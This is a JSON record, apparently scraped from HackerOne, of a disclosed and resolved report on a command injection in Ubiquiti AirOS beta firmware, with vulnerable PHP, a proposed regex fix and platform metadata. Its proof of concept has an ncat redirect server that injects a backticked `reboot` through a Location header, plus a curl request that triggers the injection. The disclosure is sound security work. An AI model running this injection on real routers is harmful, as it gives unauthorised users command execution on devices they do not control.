@@ -1,0 +1,210 @@
+{
+  "id": 139398,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkzOTg=",
+  "url": "https://hackerone.com/reports/139398",
+  "title": "Read-Only user can execute arbitraty shell commands on AirOS",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-05-17T17:47:16.026Z",
+  "submitted_at": "2016-05-17T17:47:16.026Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rbran",
+    "url": "/rbran",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 800,
+    "url": "https://hackerone.com/ui",
+    "handle": "ui",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ubiquiti Inc.",
+      "twitter_handle": "ubiquiti",
+      "website": "https://ui.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-08-05T09:36:57.491Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-07-06T09:36:38.871Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "This vulnerability is very similar to #128750, but it avoid the solution applied to the last beta XM firmware.\n\nIn this report is used the last beta XM firmware: `XM.v6.0-beta9`\n\n# Vulnerability\nThe vulnerability resides in the function `fetchCookies` file `remote.inc:117`. Just like last time is a non sanitization or verification of the server (remote) response.\n\n```\n\t\tif ($res == -11) { #received the redirect\n\t\t\t# got redirect, will have to try new one (if that's login.cgi)\n\t\t\t$lcount = count($lines);\n\t\t\tif ($lcount > 0) {\n\t\t\t\t$new_url = $lines[$lcount - 1]; # the URL returned by the attacker have shell code injected\n\t\t\t}\n\t\t\t$rg_login = \"(https?://$ip(:[[:digit:]]+)?)/login.cgi\"; #regex don't property verify the URL, it allow string before and after the URL\n\t\t\tif (IsSet($new_url) && ereg($rg_login, $new_url, $regs)) {\n\t\t\t\t$retry = 1;\n\t\t\t\t$base_url = $regs[1];\n\t\t\t\t$url = $new_url; # URL with shell code is utilized\n\t\t\t}\n\t\t}\n\t\t#[[REMOVED CODE]]\n\n\t\tif ($retry != 0) {\n\t\t\t$full_cmd = \"$cmd_trigger -p $url\"; # URL with shell code is injected\n\t\t\texec($full_cmd, $lines, $res); # shell code executed\n\t\t\t$res = getRetVal($res);\n\t\t}\n\n\t\t}\n```\n\n# Proof-of-concept\nFirst we (attacker) need to initialize a local server to make the redirect to the victim, in this example the attacker ip is `192.168.1.100`:\n```\necho -en \"HTTP/1.1 302 Found\\r\\nLocation: https://192.168.1.100/login.cgi `reboot`\\r\\nContent-Length: 0\\r\\n\\r\\n\" | ncat -lp 8080\n```\n\nSo you need to run a speed test against the attacker host, with can be done using the Web interface `https://192.168.1.20/sptest.cgi`, or by the following command (making the required adjusts):\n```\ncurl 'https://192.168.1.20/sptest_action.cgi?ticket=507&action=remote&target=192.168.1.100&port=8080&login=ignore&passwd=ignore&airosid=96ba18a3aa55ba4c6e1f8ab111a9fb8f&_=1463505340471' -H 'Cookie: AIROS_001122334455=96ba18a3aa55ba4c6e1f8ab111a9fb8f; ui_language=en_US; last_check=1463504970136' \n```\n\n# Possible Solution\nThis bug can be solved using literally 2 character, the REGEX end `$` and begin `^`:\n```\n$rg_login = \"^(https?://$ip(:[[:digit:]]+)?)/login.cgi$\";\n```",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-08-05T09:36:39.031Z",
+  "allow_singular_disclosure_after": -313103931.4692463,
+  "singular_disclosure_allowed": true,
+  "vote_count": 44,
+  "voters": [
+    "rbran",
+    "zoom7",
+    "zseano",
+    "hunter",
+    "ebrietas",
+    "secconsult",
+    "jahrek",
+    "vijay_kumar",
+    "harrymg",
+    "ngalog",
+    "and 34 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 2295,
+      "category": "researcher",
+      "content": "This report is the third of a series of three: #119317, #128750 and #139398. \nThe researcher demonstrates how a read-only user can execute shell commands on a AirOS router, bypassing the solution to #128750 and consequently #119317.\nThree reports in a row makes a \"combo\" :)",
+      "updated_at": "2016-07-30T21:58:34.059Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 33613,
+        "username": "rbran",
+        "name": "rbran",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://keybase.io/rbran",
+        "location": "",
+        "created_at": "2015-06-11T12:57:30.953Z",
+        "url": "https://hackerone.com/rbran",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542",
+          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTIxMiwicHVyIjoiYmxvYl9pZCJ9fQ==--560b0f1c63a126ce67b1b6940db7d0483abf6e09/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c056620eda1974f1f89371a5ac2cfa9203d2b27e/photo.png"
+        }
+      }
+    }
+  ],
+  "databaseId": "139398",
+  "votes": 44,
+  "latest_disclosable_activity_at": "2016-08-05T09:36:57.612Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:55:30.623298",
+    "source": "https://hackerone.com/reports/139398.json",
+    "report_id": 139398
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkzOTg=",
+    "databaseId": "139398",
+    "title": "Read-Only user can execute arbitraty shell commands on AirOS",
+    "url": "https://hackerone.com/reports/139398",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2016-08-05T09:36:57.491Z",
+    "created_at": "2016-05-17T17:47:16.026Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU4",
+      "name": "Command Injection - Generic",
+      "external_id": "cwe-77"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "rbran"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzgwMA==",
+      "handle": "ui",
+      "name": "Ubiquiti Inc.",
+      "url": "https://hackerone.com/ui",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yODY0MQ==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2016-06-08T17:55:26.289Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzEzOTM5OA==",
+    "_id": "139398",
+    "disclosed": true,
+    "votes": 44,
+    "latest_disclosable_activity_at": "2016-08-05T09:36:57.612Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkzOTg=",
+      "databaseId": "139398",
+      "title": "Read-Only user can execute arbitraty shell commands on AirOS",
+      "url": "https://hackerone.com/reports/139398",
+      "disclosed_at": "2016-08-05T09:36:57.491Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzgwMA==",
+      "handle": "ui",
+      "name": "Ubiquiti Inc.",
+      "url": "https://hackerone.com/ui",
+      "currency": "usd"
+    }
+  }
+}
